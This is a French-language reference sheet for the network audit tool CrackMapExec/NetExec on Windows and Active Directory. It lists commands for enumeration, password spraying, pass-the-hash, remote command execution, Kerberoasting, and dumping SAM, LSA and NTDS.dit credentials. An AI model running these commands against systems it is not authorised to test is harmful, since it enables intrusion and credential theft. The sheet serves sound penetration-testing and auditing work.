# CrackMapExec (NetExec)

Outil d'audit réseau tout-en-un pour Windows/AD. Supporte SMB, LDAP, WinRM, MSSQL, RDP, SSH. Renommé **NetExec** (nxc) dans les versions récentes.

## Syntaxe de base

```bash
crackmapexec <protocole> <cible> -u <user> -p <password>
# ou avec NetExec
nxc <protocole> <cible> -u <user> -p <password>
```

## SMB

### Enumération

```bash
# Vérifier si les machines sont joignables + OS + signing
cme smb 10.1.1.0/24

# Lister les shares
cme smb <cible> -u user -p pass --shares

# Lister les utilisateurs
cme smb <cible> -u user -p pass --users

# Lister les groupes
cme smb <cible> -u user -p pass --groups

# Enumérer les sessions actives
cme smb <cible> -u user -p pass --sessions

# Enumérer les disques
cme smb <cible> -u user -p pass --disks

# Null session
cme smb <cible> -u '' -p '' --shares
```

### Vérifier SMB Signing

```bash
# Lister les machines où SMB signing n'est pas requis (relayables)
cme smb 10.1.1.0/24 --gen-relay-list relayable.txt
```

### Authentification

```bash
# Mot de passe
cme smb <cible> -u user -p 'password'

# Pass-the-Hash
cme smb <cible> -u user -H <NTLM_HASH>

# Ticket Kerberos
export KRB5CCNAME=ticket.ccache
cme smb <cible> -u user --use-kcache
```

### Password Spraying

```bash
# Un mot de passe contre plusieurs utilisateurs
cme smb <cible> -u users.txt -p 'Welcome2024!' --continue-on-success

# Plusieurs mots de passe (attention au lockout)
cme smb <cible> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

### Exécution de commandes

```bash
# Méthodes d'exécution
cme smb <cible> -u admin -p pass -x 'whoami'                    # cmd.exe
cme smb <cible> -u admin -p pass -X 'Get-Process'               # PowerShell

# Choisir la méthode
cme smb <cible> -u admin -p pass -x 'whoami' --exec-method smbexec
cme smb <cible> -u admin -p pass -x 'whoami' --exec-method wmiexec
cme smb <cible> -u admin -p pass -x 'whoami' --exec-method atexec
```

### Dump de credentials

```bash
# SAM (hashes locaux)
cme smb <cible> -u admin -p pass --sam

# LSA secrets
cme smb <cible> -u admin -p pass --lsa

# NTDS.dit (tous les hashes AD, sur un DC)
cme smb <DC_IP> -u admin -p pass --ntds
```

## LDAP

```bash
# Enumération de base
cme ldap <DC_IP> -u user -p pass

# Utilisateurs avec description (mots de passe parfois dedans)
cme ldap <DC_IP> -u user -p pass -M get-desc-users

# Kerberoastable accounts
cme ldap <DC_IP> -u user -p pass --kerberoasting output.txt

# AS-REP Roastable accounts
cme ldap <DC_IP> -u user -p pass --asreproast output.txt

# Comptes avec mot de passe qui n'expire jamais
cme ldap <DC_IP> -u user -p pass --password-not-required

# MAQ (Machine Account Quota)
cme ldap <DC_IP> -u user -p pass -M maq
```

## WinRM

```bash
# Vérifier l'accès WinRM
cme winrm <cible> -u admin -p pass

# Exécuter une commande
cme winrm <cible> -u admin -p pass -x 'whoami'
cme winrm <cible> -u admin -p pass -X 'Get-Process'
```

## MSSQL

```bash
# Enumération
cme mssql <cible> -u sa -p pass

# Exécuter une requête
cme mssql <cible> -u sa -p pass -q "SELECT name FROM sys.databases"

# xp_cmdshell
cme mssql <cible> -u sa -p pass -x 'whoami'
```

## Modules utiles

```bash
# Lister les modules disponibles
cme smb -L

# Exemples
cme smb <cible> -u user -p pass -M spider_plus          # Spider les shares
cme smb <cible> -u user -p pass -M webdav               # Vérifier WebDAV
cme ldap <DC_IP> -u user -p pass -M laps                # Récupérer LAPS passwords
cme smb <cible> -u user -p pass -M petitpotam            # Tester PetitPotam
```

## Astuces

```bash
# Résultats : Pwn3d! = admin local, [+] = auth ok, [-] = auth fail
# La base de données des credentials est dans ~/.cme/cmedb
cmedb                                                    # Explorer les résultats passés
```
